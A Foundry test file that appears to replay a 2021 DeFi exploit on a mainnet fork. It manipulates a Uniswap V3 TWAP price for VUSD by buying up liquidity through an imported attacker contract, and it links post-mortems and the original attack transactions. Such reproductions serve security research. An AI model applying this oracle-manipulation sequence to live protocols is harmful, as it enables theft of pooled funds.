pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "src/Attacker.sol";

/*
# Post Mortems
https://twitter.com/jai_bhavnani/status/1455598838433992704
https://twitter.com/Mudit__Gupta/status/1455627465678749696
# TX:
Manipulation: https://etherscan.io/tx/0x89d0ae4dc1743598a540c4e33917efdce24338723b0fabf34813b79cb0ecf4c5
Deposit & Borrow: https://etherscan.io/tx/0x8527fea51233974a431c92c4d3c58dee118b05a3140a04e0f95147df9faf8092
V3 Position: https://opensea.io/assets/0xc36442b4a4522e871399cd717abdd847ab11fe88/148496
Attacker contract: 0x7993e1d66ffb1ab3fb1cb3db87219f532c25bdc8
# Code:
fuse-VUSD: (fVUSD-23) https://etherscan.io/address/0x2914e8c1c2c54e5335dc9554551438c59373e807#code (deposit)
fuse-WBTC: (fVUSD-23) https://etherscan.io/address/0x0302f55dc69f5c4327c8a6c3805c9e16fc1c3464 (borrow)
Minter.sol (USDC to VUSD): https://etherscan.io/address/0xb652fc42e12828f3f1b3e96283b199e62ec570db#code
*/

contract AttackerTest is Test {
    uint256 mainnetFork;

    string mainnetRpcUrl = vm.envString("MAINNET_RPC_URL");

    uint256 constant FIRST_TX_BLOCK = 13537922;
    uint256 constant SECOND_TX_BLOCK = 13537933;

    uint32 constant TWAP_SECONDS_AGO = 600;

    address attackerEOA = address(0x12345);

    Attacker attacker;

    function setUp() public {
        mainnetFork = vm.createFork(mainnetRpcUrl);
        vm.selectFork(mainnetFork);
        vm.rollFork(FIRST_TX_BLOCK);

        attacker = new Attacker();
    }

    function testSetUp() public {
        assertEq(vm.activeFork(), mainnetFork);
        assertEq(block.number, FIRST_TX_BLOCK);
    }

    function testPrintUniswapTwapPrice() public {
        while (block.number < SECOND_TX_BLOCK) {
            uint256 blockNumber = block.number;
            uint256 price = attacker.getUniswapTwapPrice(TWAP_SECONDS_AGO);

            console.log("--- Block", blockNumber);
            console.log("  Price:", price);

            vm.roll(++blockNumber);
        }
    }

    function testPrintUniswapTwapPriceWithManipulation() public {
        vm.startPrank(attackerEOA);
        vm.deal(attackerEOA, 1000 ether);

        // attacker.manipulateUniswapV3{value: 1000 ether}();
        attacker.buyUSDC{value: 1000 ether}();

        console.log("=== Current price before swap ===");
        console.log("  Price:", attacker.getUniswapTwapPrice(TWAP_SECONDS_AGO));

        attacker.buyAllVUSD();
        // console.log("=== Current price after swap ====");
        // console.log("  Price:", attacker.getUniswapTwapPrice(TWAP_SECONDS_AGO));

        while (block.number < SECOND_TX_BLOCK) {
            uint256 blockNumber = block.number;
            uint256 price = attacker.getUniswapTwapPrice(TWAP_SECONDS_AGO);

            console.log("--- Block", blockNumber);
            console.log("  Price:", price);

            vm.roll(++blockNumber);
        }
    }
}
